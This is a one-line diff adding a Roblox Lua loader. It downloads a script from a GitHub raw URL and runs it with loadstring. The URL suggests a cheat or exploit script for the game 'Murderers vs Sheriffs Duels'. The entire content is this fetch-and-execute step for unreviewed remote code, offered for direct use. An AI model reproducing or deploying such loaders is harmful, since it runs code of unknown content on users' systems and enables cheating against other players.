@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/mvsd-murderers-vs-sheriffs-duels-spam4-9qcrw2uoo5uo3i.lua"))()
